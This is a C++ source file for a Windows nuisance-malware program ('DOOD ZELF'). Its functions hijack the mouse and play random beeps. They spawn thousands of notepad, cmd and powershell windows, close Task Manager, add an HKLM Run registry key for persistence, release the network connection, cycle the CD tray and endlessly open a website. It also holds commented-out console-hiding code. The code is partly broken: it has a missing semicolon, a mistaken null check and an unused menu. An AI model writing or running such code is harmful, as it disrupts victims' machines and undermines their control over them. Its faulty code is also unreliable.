#include<iostream>
#include<string>
#include<windows.h>
#include<fstream>
#include<winuser.h>
#include<Lmcons.h>
#include<math.h>
#include<stdlib.h>
#include<WinInet.h>
#include<ShlObj.h>
#include<stdio.h>
#include<conio.h>

#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "WinInet.lib")
#pragma comment(lib, "urlmon.lib")

using namespace std;




void Privet();
void makeSomeNoise();
void Kimternet();
void cdIn2018Really();
void startMeUp();
void byebyeTaskmgr();
void trickyMouse();
void scoobyDoo();





void trickyMouse() {
    
    int i,x,y;
    
    for(i=0;i<201;i++)
    {
        x = rand()%1001;
        y = rand()%801;
        SetCursorPos(x,y);
        Sleep(200);
    }
    
}





void makeSomeNoise(){
    
    int Freq,Dur,i;
    
    for(i=0;i<2001;i++)
    {
        Freq = rand()%2001;
        Dur = rand()%501;
        Beep(Freq,Dur);
    }
    
}


void startMeUp(){
    
    int i;
    
    for(i=0;i<1001;i++)
    {
        ShellExecute(NULL, "open", "notepad.exe", NULL, NULL, SW_MAXIMIZE);
        ShellExecute(NULL, "open", "cmd.exe", NULL, NULL, SW_MAXIMIZE);
        ShellExecute(NULL, "open", "powershell.exe", NULL, NULL, SW_MAXIMIZE);
    }
    
    
}



void byebyeTaskmgr(){
    
    HWND hWnd = FindWindow(NULL, "Windows Task Manager");
    
    if(FindWindow != NULL)
    {
        PostMessage(hWnd, WM_QUIT, true, true);
    }
    
}


void Privet(){
    
    ::HKEY Handle_Key = 0;
    ::DWORD Dispoition = 0;
    ::RegOpenKeyEx( HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &Handle_Key );
    const unsigned char Path[MAX_PATH] = "C:\\Windows\\YourProgramName.exe";
    ::RegSetValueEx( Handle_Key, "My Directory", 0, 1, Path, sizeof(unsigned char));
    
}


void Kimternet(){
    
    system("ipconfig /release");
    
}







void cdIn2018Really(){
    
    
    mciSendString("set CDAudio door open", NULL, 0, NULL);
    Sleep(2000);
    
    mciSendString("set CDAudio door closed", NULL, 0, NULL);
    Sleep(5000);
    
    mciSendString("set CDAudio door open", NULL, 0, NULL);
    Sleep(2000);
    
    mciSendString("set CDAudio door closed", NULL, 0, NULL);
    Sleep(5000);
    
    mciSendString("set CDAudio door open", NULL, 0, NULL);
    Sleep(2000);
    
    mciSendString("set CDAudio door closed", NULL, 0, NULL);
    Sleep(5000);
    
    mciSendString("set CDAudio door open", NULL, 0, NULL);
    Sleep(2000);
    
    mciSendString("set CDAudio door closed", NULL, 0, NULL);
    Sleep(5000);
    
    
}




void scoobyDoo(){
    
    while(1==1){
        
    ShellExecute(NULL, "open", "http://www.fsb.ru/",NULL,NULL,SW_SHOWDEFAULT);
        
    }
}





int main(){

    int n;
    
    // Make America Stealthy again
    
    //HWND Stealth;
    //AllocConsole();
    //Stealth = FindWindowA("ConsoleWindowClass",NULL);
    //ShowWindow(Stealth,0);
    
    cout << "         This is DOOD ZELF 0.6.6.6 - Death Itself" << endl;
    cout << "You are fucking LUCKY !!! >> Debug mode ON << Choose your weapon: "
    cout << "The Website Of Luck" << endl;
    cout << "Bipolar CD Tray" << endl;
    cout << "No Internet" << endl;
    cout << "Nothing to manage here" << endl;
    cout << "Make some noise" << endl;
    cout << "Unix daemon haunting Windows" << endl;
    cout << "Are these your programs?" << endl;
    cin >> n;



}
